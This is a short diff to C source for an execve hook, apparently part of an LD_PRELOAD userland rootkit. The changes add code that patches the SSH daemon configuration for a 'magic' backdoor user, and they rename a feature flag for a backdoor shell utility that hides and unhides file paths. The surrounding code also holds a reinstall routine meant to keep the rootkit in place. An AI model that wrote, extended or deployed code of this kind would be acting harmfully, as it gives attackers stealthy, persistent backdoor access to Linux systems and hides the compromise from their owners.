@@ -2,13 +2,22 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 #ifdef DO_REINSTALL
     if(!not_user(0)) reinstall();
 #endif
+#ifdef PATCH_SSHD_CONFIG
+    sshdpatch(REG_USR);
+#endif
 
     hook(CEXECVE);
 
     if(is_bdusr()){
-#ifdef HIDING_UTIL                                     /* running ./bdv from a backdoor shell  */
+#ifdef BACKDOOR_UTIL                                     /* running ./bdv from a backdoor shell  */
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))   /* allows you to hide & unhide paths on */
             do_hidingutil(argv);                       /* the fly.                             */
+#endif
+#ifdef PATCH_SSHD_CONFIG
+        if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
+            sshdpatch(MAGIC_USR);
+            exit(0);
+        }
 #endif
         return (long)call(CEXECVE, filename, argv, envp);
     }
